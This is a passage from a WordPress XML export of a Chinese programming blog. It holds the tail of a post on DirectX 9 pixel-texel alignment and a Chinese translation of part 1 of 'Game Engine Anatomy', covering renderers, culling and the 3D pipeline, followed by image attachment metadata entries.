There's lots of different ways to write a solution, and you should be able to come up with your own once you understand it. It is confusing though, and is something that trips you up a thousand times in DX9...

The problem is that when drawing a full-screen quad, DX9 places your vertices at the middle of pixels (left side), whereas everyone else places them at the corners of pixels (right side).
<img src="http://files.blogcn.com/wp01/M00/04/33/wKgKClAL9uQAAAAAAAAniE3Ujhc309.jpg" alt="" />

When the pixel-shader runs (or fixed-function texturing), the texture-coordinates that it uses are calculated by interpolating the vertices based on how close the current pixel is to each vertex. You can see that in the DX9 version, the top-left pixel lines up perfectly with vertex "A", so when interpolating for that pixel, it uses 100% of tex-coord A and 0% of tex-coord B.

This is a problem because when sampling textures, the coordinate you're supposed to use it the centre of the texel that you want to sample, not the top-left corner of the texel!

If A has u=0 and B has u=1 and your texture is 4px wide, then the u value for the center of the top-left pixel is 0.125 (i.e. half a pixel across out of 4 wide, 0.5/4, or 12.5% of B + 87.5% of A). 

]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>165</wp:post_id>
		<wp:post_date>2012-07-22 20:54:47</wp:post_date>
		<wp:post_date_gmt>2012-07-22 12:54:47</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>pixel-texel-alignment</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[16]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343358804]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>游戏引擎剖析 (1)</title>
		<link>http://codemylife.blogcn.com/2012/08/%e6%b8%b8%e6%88%8f%e5%bc%95%e6%93%8e%e5%89%96%e6%9e%90-1/</link>
		<pubDate>Wed, 08 Aug 2012 11:02:05 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[技术]]></category>

		<category domain="category" nicename="%e6%8a%80%e6%9c%af"><![CDATA[技术]]></category>

		<category domain="tag"><![CDATA[游戏开发]]></category>

		<category domain="tag" nicename="%e6%b8%b8%e6%88%8f%e5%bc%80%e5%8f%91"><![CDATA[游戏开发]]></category>

		<category><![CDATA[游戏开发]]></category>

		<category domain="category" nicename="%e6%b8%b8%e6%88%8f%e5%bc%80%e5%8f%91"><![CDATA[游戏开发]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=172</guid>
		<description></description>
		<content:encoded><![CDATA[最近在网上讲游戏开发的很不错的文章，便摘录下来，原文出处找不到了，感谢原作者与译者！

游戏引擎剖析
原文作者：Jake Simpson
译者： 向海
Email：GameWorldChina@myway.com

<strong>第1部分: 游戏引擎介绍， 渲染和构造3D世界</strong>
<strong>介绍</strong>
自Doom游戏时代以来我们已经走了很远。 DOOM不只是一款伟大的游戏，它同时也开创了一种新的游戏编程模式: 游戏 "引擎"。 这种模块化，可伸缩和扩展的设计观念可以让游戏玩家和程序设计者深入到游戏核心，用新的模型，场景和声音创造新的游戏， 或向已有的游戏素材中添加新的东西。大量的新游戏根据已经存在的游戏引擎开发出来，而大多数都以ID公司的Quake引擎为基础， 这些游戏包括Counter Strike， Team Fortress， Tac Ops， Strike Force， 以及Quake Soccer。

Tac Ops 和Strike Force 都使用了Unreal Tournament 引擎。事实上， "游戏引擎" 已经成为游戏玩家之间交流的标准用语，但是究竟引擎止于何处，而游戏又从哪里开始呢?像素的渲染，声音的播放，怪物的思考以及游戏事件的触发，游戏中所有这一切的幕后又是什么呢？ 如果你曾经思考过这些问题， 而且想要知道更多驱动游戏进行的东西，那么这篇文章正好可以告诉你这些。 本文分多个部分深入剖析了游戏引擎的内核， 特别是Quake引擎，因为我最近工作的公司Raven Software已经在Quake引擎的基础上开发出了多款游戏，其中包括著名的Soldier of Fortune 。

<strong>开始</strong>
让我们首先来看看一个游戏引擎和游戏本身之间的主要区别。 许多人们会混淆游戏引擎和整个游戏 。这有点像把一个汽车发动机和整个汽车混淆起来一样 。 你能够从汽车里面取出发动机， 建造另外一个外壳，再使用发动机一次。 游戏也像那。 游戏引擎被定义为所有的非游戏特有的技术。 游戏部份是被称为 '资产' 的所有内容 (模型，动画，声音，人工智能和物理学)和为了使游戏运行或者控制如何运行而特别需要的程序代码， 比如说AI--人工智能。

对于曾经看过 Quake 游戏结构的人来说， 游戏引擎就是 Quake。exe ，而游戏部分则是 QAGame。dll和 CGame。dll 。 如果你不知道这是什么意思， 也没有什么关系；在有人向我解释它以前， 我也不知道是什么意思。 但是你将会完全明白它的意思。 这篇游戏引擎指导分为十一个部份。 是的， 从数量上来说，总共是十一个部份! 每个部分大概3000字左右。现在就从第一部分开始我们的探索吧，深入我们所玩游戏的内核，在这里我们将了解一些基本的东西， 为后面的章节作铺垫。。。

<strong>渲染器</strong>
让我们从渲染器来开始游戏引擎设计的探讨吧， 我们将从游戏开发者(本文作者的背景)的角度来探讨这些问题。事实上，在本文的各个段落，我们将常常从游戏开发者的角度探讨， 也让您像我们一样思考问题!

什么是渲染器，为什么它又这么重要呢？好吧，如果没有它，你将什么也看不到。它让游戏场景可视化，让玩家/观众可以看见场景，从而让玩家能够根据屏幕上所看到的东西作出适当的决断。 尽管我们下面的探讨可能让新手感到有些恐惧，先别去理会它。 渲染器做些什么？为什么它是必须的？我们将会解释这些重要问题。

当构造一个游戏引擎的时候， 你通常想做的第一件事情就是建造渲染器。 因为如果看不见任何东西 – 那么你又如何知道你的程序代码在工作呢? 超过 50% 的 CPU 处理时间花费在渲染器上面； 通常也是在这个部分，游戏开发者将会受到最苛刻的评判。 如果我们在这个部分表现很差，事情将会变得非常糟糕， 我们的程序技术，我们的游戏和我们的公司将在 10 天之内变成业界的笑话。 它也是我们最依赖于外部厂商和力量的地方，在这里他们将处理最大限度的潜在操作目标。 如此说来， 建造一个渲染器确实不象听起来那么吸引人（事实如此）， 但如果没有一个好的渲染器， 游戏或许永远不会跻身于排行榜前10 名。

如今，在屏幕上生成像素，涉及到 3D 加速卡， API ，三维空间数学， 对 3D 硬件如何工作的理解等等。对於主机（游戏机）游戏来说，也需要相同类型的知识，但是至少对于主机， 你不必去尝试击中一个移动中的目标。 因为一台主机的硬件配置是固定的 "时间快照"， 和PC（个人计算机）不同， 在一台主机的生命期中，它的硬件配置不会改变。

在一般意义上，渲染器的工作就是要创造出游戏的视觉闪光点，实际上达到这个目标需要大量的技巧。3D图形本质上是用最少的努力创造出最大效果的一门艺术， 因为额外的 3D 处理在处理器时间和和內存带宽方面都是极为昂贵的。 它也是一种预算， 要弄清楚你想在什么地方花费处理器时间，而你宁愿在什么地方节省一些从而达到最好的整体效果。 接下来我们将会介绍一些这方面的工具，以及怎样更好的用它们让游戏引擎工作。

<strong>建造3D世界</strong>
最近，当我和一位从事计算机图形方面工作长达数年之久的人会谈时，她向我吐露道， 当她第一次看到实时操纵计算机 3D 图象时， 她不知道这是怎么实现的， 也不知道计算机如何能够存储 3D 图象。 今天这对于在大街上的普通人来说或许是真实的，即使他们时常玩 PC 游戏， 游戏机游戏， 或街机游戏。

下面我们将从游戏设计者的角度讨论创造 3D 世界的一些细节，你也应该看一看 Dave Salvator 所写的“3D 管线导论“，以便对3D 图象生成的主要过程有一个整体的了解。

3D 物体（对象）被储存成 3D 世界中的一系列点(被称为顶点)， 彼此之间有相互关系，所以计算机知道如何在世界中的这些点之间画线或者是填充表面。 一个立方体由8个点组成，每个角一个点。立方体有 6个表面， 分别代表它的每一个面。 这就是 3D 对象储存的基础。 对于一些比较复杂的 3D 物体， 比如说一个 Quake 的关卡，将有数以千计(有时数以十万计)的顶点， 和数以千计的多边形表面。

参见上图的线框表示（注：原文在这里有一幅图）。 本质上与上面的立方体例子类似， 它仅仅是由许许多多的小多边形组成的一些复杂场景。

模型和世界如何储存是渲染器的一部份功能， 而不属于应用程序/游戏部份。 游戏逻辑不需要知道对象在內存中如何表示， 也不需要知道渲染器将怎样把他们显示出来。 游戏只是需要知道渲染器将使用正确的视野去表示对象， 并将在正确的动画幀中把正确的模型显示出来。

在一个好的引擎中，渲染器应该是可以完全被一个新的渲染器替换掉， 并且不需要去改动游戏的一行代码。许多跨平台引擎， 而且许多自行开发的游戏机引擎就是这样的，如 Unreal 引擎， --举例来说，这个游戏 GameCube 版本的渲染器就可以被你任意的替换掉。

让我们再看看内部的表示方法—除了使用坐标系统，还有其他方法可以在计算机內存里表示空间的点。

在数学上，你可以使用一个方程式来描述直线或曲线， 并得到多边形， 而<span style="color: #0000ff;">几乎所有的 3D 显示卡都使用多边形来作为它们的最终渲染图元。 一个图元就是你在任何显示卡上面所能使用的最低级的绘制（渲染）单位，几乎所有的硬件都是使用三个顶点的多边形(三角形)</span>。 新一代的 nVidia 和 ATI 显卡可以允许你以数学方式渲染(被称为高次表面)， 但因为这不是所有图形卡的标准， 你还不能靠它作为渲染策略。

从计算的角度来看，这通常有些昂贵，但它时常是新的实验技术的基础， 例如， 地表的渲染， 或者对物件锐利的边缘进行柔化。 我们将会在下面的曲面片小节中更进一步介绍这些高次表面。

<strong>剔除概观</strong>
问题来了。 我现在有一个由几十万个顶点/多边形描述的世界。 我以第一人称视角位于我们这个 3D 世界的一边。 在视野中可以看见世界的一些多边形， 而另外一些则不可见， 因为一些物体， 比如一面看得见的墙壁， 遮挡住了它们。 即使是最好的游戏编码人员， 在目前的 3D 显卡上， 在一个视野中也不能处理 300，000个三角形且仍然维持 60fps (一个主要目标)。 显卡不能处理它， 因此我们必须写一些代码，在把它们交给显卡处理之前除去那些看不见的多边形。 这个过程被称为剔除。

有许多不同的剔除方法。 在深入了解这些之前，让我们探讨一下为什么图形显示卡不能处理超高数量的多边形。 我是说，最新的图形卡每秒钟不能处理几百万个多边形吗？它不应该能够处理吗? 首先，你必须理解市场销售宣称的多边形生成率和真实世界的多边形生成率。 行销上宣称的多边形生成率是图形显示卡理论上能够达到的多边形生成率。

如果全部多边形都在屏幕上， 相同的纹理，相同的尺寸大小， 正在往显示卡上传送多边形的应用程序除了传送多边形以外什么也不做， 这时显卡能处理多少多边形数量， 就是图形芯片厂商呈现给你的数字。

然而，在真实的游戏情形中，应用程序时常在后台做着许多其他的事情 -- 多边形的 3D 变换， 光照计算， 拷贝较多的纹理到显卡內存， 等等。 不仅纹理要送到显示卡， 而且还有每个多边形的细节。一些比较新的显卡允许你实际上在显卡內存本身里面储存模型/世界几何细节， 但这可能是昂贵的，将会耗光纹理正常可以使用的空间，所以你最好能确定每一幀都在使用这些模型的顶点， 否则你只是在浪费显示卡上的存储空间。 我们就说到这里了。 重要的是，在实际使用显卡时，并不必然就能达到你在显卡包装盒上所看到的那些指标，如果你有一个比较慢速的CPU ， 或没有足够的內存时，这种差异就尤为真实。

<strong>基本的剔除方法</strong>
最简单的剔除方式就是把世界分成区域， 每个区域有一个其他可见区域的列表。 那样， 你只需要显示针对任何给定点的可见部分。 如何生成可见视野区域的列表是技巧所在。 再者， 有许多方法可以用来生成可见区域列表， 如 BSP 树， 窥孔等等。

可以肯定，当谈论 DOOM 或 QUAKE 时，你已经听到过使用 BSP 这个术语了。 它表示二叉空间分割。

BSP 是一种将世界分成小区域的的方法，通过组织世界的多边形，容易确定哪些区域是可见的而哪些是不可见的 – 从而方便了那些不想做太多绘制工作的基于软件的渲染器。它同时也以一种非常有效的方式让你知道你位于世界中的什么地方。

在基于窥孔的引擎 ( 最早由 3D Realms 已经取消的 Prey 项目引入游戏世界 )里，每个区域 ( 或房间) 都建造有自己的模型， 通过每个区域的门 ( 或窥孔 )能够看见另外的区段。 渲染器把每个区域作为独立的场景单独绘制。 这就是它的大致原理。 足以说这是任何一个渲染器的必需部份，而且非常重要。

尽管一些这样的技术归类在 "遮挡剔除"之下，但是他们全部都有同样的目的: 尽早消除不必要的工作。

对於一个FPS游戏(第一人称射击游戏) 来说，视野中时常有许多三角形，而且游戏玩家承担视野的控制，丢弃或者剔除不可见的三角形就是绝对必要的了。 对空间模拟来说也是这样的， 你可以看见很远很远的地方 – 剔除超过视觉范围外面的东西就非常重要。 对于视野受到限制的游戏来说 – 比如 RTS (即时战略类游戏)--通常比较容易实现。 通常渲染器的这个部份还是由软件来完成， 而不是由显卡完成， 由显卡来做这部分工作只是一个时间问题。

<strong>基本的图形管线流程</strong>
一个简单的例子，从游戏到多边形绘制的图形管线过程大致是这样:

· 游戏决定在游戏中有哪些对象， 它们的模型， 使用的纹理， 他们可能在什么动画幀，以及它们在游戏世界里的位置。 游戏也决定照相机的位置和方向。

· 游戏把这些信息传递给渲染器。以模型为例 ，渲染器首先要查看模型的大小 ，照相机的位置， 然後决定模型在屏幕上是否全部可见， 或者在观察者 (照相机视野) 的左边，在观察者的后面，或距离很远而不可见。它甚至会使用一些世界测定方式来计算出模型是否是可见的。 (参见下面这条)

· 世界可视化系统决定照相机在世界中的位置，并根据照相机视野决定世界的哪些区域 / 多边形是可见的。有许多方法可以完成这个任务， 包括把世界分割成许多区域的暴力方法，每个区域直接为"我能从区域 D 看见区域 AB &amp; C"， 到更精致的 BSP(二叉空间分割)世界。 所有通过这些剔除测试的多边形被传递给多边形渲染器进行绘制。

· 对於每一个被传递给渲染器的多边形， 渲染器依照局部数学 ( 也就是模型动画) 和世界数学(相对于照相机的位置?)对多边形进行变换，并检查决定多边形是不是背对相机 (也就是远离照相机)。背面的多边形被丢弃。 非背面的多边形由渲染器根据发现的附近灯光照亮。然后渲染器要看多边形使用的纹理， 并且确定 API/ 图形卡正在使用那种纹理作为它的渲染基础。 在这里，多边形被送到渲染 API，然后再送给显卡。

很明显这有些过分简单化了，但你大概理解了。 下面的图表摘自Dave Salvator's 3D 管线一文，可以给你多一些具体细节:

3D 管线 - 高层的概观

1. 应用程序/ 场景

·场景/ 几何数据库遍历
·对象的运动，观察相机的运动和瞄准
·对象模型的动画运动
·3D 世界内容的描述
·对象的可见性检查，包括可能的遮挡剔除
·细节层次的选择 (LOD)

2. 几何

·变换 (旋转，平移， 缩放)
·从模型空间到世界空间的变换 (Direct3D)
·从世界空间到观察空间变换
·观察投影
·细节接受/ 拒绝 剔除
·背面剔除 (也可以在后面的屏幕空间中做)
光照
·透视分割 - 变换到裁剪空间
·裁剪
·变换到屏幕空间

3. 三角形生成

·背面剔除 ( 或者在光照计算之前的观察空间中完成)
·斜率/ 角度计算
·扫瞄线变换

4. 渲染 / 光栅化

·着色
·纹理
·雾
·Alpha 透明测试
·深度缓冲
·抗锯齿 (可选择的)
·显示

<span style="color: #0000ff;">通常你会把所有的多边形放到一些列表内， 然後根据纹理对这个列表排序(这样你只需要对显卡传送一次纹理， 而不是每个多边形都传送一次)</span>， 等等。在过去，会把多边形按照它们到相机的距离进行排序，首先绘制那些距离相机最远的多边形， 但现在由于 Z 缓冲的出现，这种方法就不是那么重要了。

当然那些透明的多边形要除外，它们要在所有的非半透明多边形绘制之后才能够绘制 ，这样一来，所有在它们后面的多边形就能正确地在场景中显现出来。 当然，像那样，实际上你必须得从后到前地绘制那些多边形。 但时常在任何给定的 FPS 游戏场景中， 通常没有太多透明的多边形。 它可能看起来像有，但实际上与那些不透明的多边形相比，其比率是相当低的。

一旦应用程序将场景传递到 API， API 就能利用硬件加速的变换和光照处理 (T&amp;L)， 这在如今的 3D 显卡中是很平常的事情。 这里不讨论涉及到的矩阵数学(参见Dave的 3D 管线导论)，<span style="color: #0000ff;">几何变换允许 3D 显卡按照你的尝试，根据相机在任何时间的位置和方向，在世界的正确角度和位置绘制多边形</span>。

对于每个点或顶点都有大量的计算， 包括裁剪运算，决定任何给定的多边形实际上是否可见，在屏幕上完全不可见或部分可见。 光照运算，计算纹理色彩明亮程度，这取决于世界的灯光从什么角度如何投射到顶点上。 过去，处理器处理这些计算，但现在，当代图形硬件就能为你做这些事情， 这意谓着你的处理器可以去做其他的事情了。很明显这是件好事情 (tm) ，由于不能指望市面上所有的 3D 显卡板上都有 T &amp; L， 所以无论如何你自己将必须写所有的这些例程 (再一次从游戏开发者角度来说)。 你将在本文各处的不同段落看到 "好事情 ( tm)" 这个词汇。 我认为，这些特征为使游戏看起来更好作出了非常有用的贡献。 毫不令人吃惊，你也将会看见它的对立面；你猜到了，那就是“坏事情 (tm)”。 我正在尝试争取这些词汇的版权， 你要使用他们就得支付一笔小小的费用哟。

<strong>曲面片（高次表面</strong>）
除了三角形，曲面片的使用现在正变得更普遍。 因为他们能用数学表达式来描述几何 ( 通常涉及某种曲线的几何形体) ，而不仅仅只是列出大量的多边形以及在游戏世界中的位置， 所以曲面片 ( 高次表面的另一个名称) 非常好。 这样，你实际上就能够动态地根据方程式来建立( 和变形 )多边形网格， 并决定你实际想要从曲面片上看到的多边形数量。

因此，举例来说，你可以描述一个管道， 然后在世界中就可以有这种管道的许多样例。 在一些房间中， 你已经显示了 10,000个多边形，你可以说，"因为我们已经显示了大量的多边形，而且任何更多的多边形将会使幀速率下降， 所以这个管道应该只有 100 个多边形"。 但在另外一个房间中， 视野中只有 5,000个可见的多边形，你可以说，"因为我们还没有达到预算可以显示的多边形数量 ， 所以，现在这个管道能有 500 个多边形"。 非常美妙的东西 --但你必须首先知道所有这些，并建立网格，这不是无足轻重的。 通过 AGP 传送同一个对象的曲面方程确实要比传送其大量顶点节省成本。 SOF2 就使用了这个方法的一种变体来建立它的地表系统。

事实上现在的 ATI 显卡具有 TruForm， 它能带一个以三角形为基础的模型，并将该模型转换为基于高次表面的模型，使其平滑 — 接着再用十倍三角形数量把模型转换回基于大量三角形的模型 (被称retesselation)。然后模型送往管线做进一步的处理。 实际上 ATI 仅仅在 T &amp; L 引擎之前增加了一个阶段来处理这个过程。这里的缺点是，要控制哪些模型需要被平滑处理而哪些又不需要。你常常想要一些边缘比较尖锐， 比如鼻子，但它却被不恰当的平滑过了。 这仍然是一种很好的技术，而且我能预见它在将来会被更多的应用。

这就是第一部份 -- 我们将会在第二部分继续介绍光照和纹理，下面的章节会更加深入。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>172</wp:post_id>
		<wp:post_date>2012-08-08 19:02:05</wp:post_date>
		<wp:post_date_gmt>2012-08-08 11:02:05</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e6%b8%b8%e6%88%8f%e5%bc%95%e6%93%8e%e5%89%96%e6%9e%90-1</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[13]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1344423843]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>caomugu</title>
		<link>http://codemylife.blogcn.com/?attachment_id=179</link>
		<pubDate>Tue, 02 Oct 2012 14:01:39 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp06/M00/03/B4/wKgKDVBq88MAAAAAAAe8UUnk-CA618.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>179</wp:post_id>
		<wp:post_date>2012-10-02 22:01:39</wp:post_date>
		<wp:post_date_gmt>2012-10-02 14:01:39</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>caomugu</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp06/M00/03/B4/wKgKDVBq88MAAAAAAAe8UUnk-CA618.png</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"697";s:6:"height";s:3:"459";s:14:"hwstring_small";s:23:"height='84' width='128'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/04/6D/wKgKClBq88MAAAAAAABH5zuTds8041.png";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"123";s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/06/5F/wKgKDFBq88MAAAAAAADF31UBUwQ820.png";}s:5:"large";a:3:{s:5:"width";s:3:"494";s:6:"height";s:3:"325";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/06/9C/wKgKClBq88MAAAAAAASU_Q3LO1A395.png";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/06/B8/wKgKClBq88MAAAAAAAe8US34oek896.png";}]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>larouwandouzou</title>
		<link>http://codemylife.blogcn.com/?attachment_id=180</link>
		<pubDate>Tue, 02 Oct 2012 14:01:52 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp03/M00/06/B8/wKgKClBq89AAAAAAAAimXTrBBQY721.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>180</wp:post_id>
		<wp:post_date>2012-10-02 22:01:52</wp:post_date>
		<wp:post_date_gmt>2012-10-02 14:01:52</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>larouwandouzou</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp03/M00/06/B8/wKgKClBq89AAAAAAAAimXTrBBQY721.png</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"701";s:6:"height";s:3:"530";s:14:"hwstring_small";s:23:"height='96' width='128'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/06/78/wKgKDVBq89EAAAAAAABH9GYshBg002.png";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"142";s:3:"url";s:73:"http://files.blogcn.com/wp06/M00/09/28/wKgKDFBq89EAAAAAAADdBgnFgLU685.png";}s:5:"large";a:3:{s:5:"width";s:3:"494";s:6:"height";s:3:"373";s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/06/6E/wKgKDVBq89EAAAAAAAUUqh5m3aI914.png";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/06/6E/wKgKDVBq89EAAAAAAAimXQFm4cs255.png";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>yinertang</title>
		<link>http://codemylife.blogcn.com/?attachment_id=181</link>
		<pubDate>Tue, 02 Oct 2012 14:02:11 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp06/M00/09/28/wKgKDFBq8-MAAAAAAAfmqicEKiE801.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>181</wp:post_id>
		<wp:post_date>2012-10-02 22:02:11</wp:post_date>
		<wp:post_date_gmt>2012-10-02 14:02:11</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>yinertang</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp06/M00/09/28/wKgKDFBq8-MAAAAAAAfmqicEKiE801.png</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"646";s:6:"height";s:3:"528";s:14:"hwstring_small";s:23:"height='96' width='117'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/08/AF/wKgKC1Bq8-QAAAAAAABEKECUWrQ008.png";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"153";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/06/36/wKgKC1Bq8-QAAAAAAADh5jUIfC4136.png";}s:5:"large";a:3:{s:5:"width";s:3:"494";s:6:"height";s:3:"403";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/06/36/wKgKC1Bq8-QAAAAAAAVVpTM1dsE372.png";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/08/AF/wKgKC1Bq8-QAAAAAAAfmqh63M-M178.png";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>十一</title>
		<link>http://codemylife.blogcn.com/2012/10/%e5%8d%81%e4%b8%80/</link>
		<pubDate>Tue, 02 Oct 2012 14:54:15 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[生活]]></category>

		<category domain="category" nicename="%e7%94%9f%e6%b4%bb"><![CDATA[生活]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=178</guid>
		<description></description>
